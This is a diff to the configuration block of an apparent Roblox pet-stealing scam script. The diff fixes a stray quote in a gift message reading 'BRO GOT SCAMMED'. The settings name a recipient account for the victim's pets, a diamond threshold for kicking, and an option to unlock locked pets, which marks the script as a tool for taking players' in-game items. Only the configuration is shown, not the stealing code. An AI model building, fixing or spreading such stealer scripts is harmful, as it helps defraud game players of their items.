@@ -2,7 +2,7 @@
 
 --[[ Main Config ]]--
 _G.Username = "ScriptingLoaded" --// Username To Send Pets To
-_G.GiftMessage = "BRO GOT SCAMMED"" --// Message For The Gift To Say
+_G.GiftMessage = "BRO GOT SCAMMED" --// Message For The Gift To Say
 
 _G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
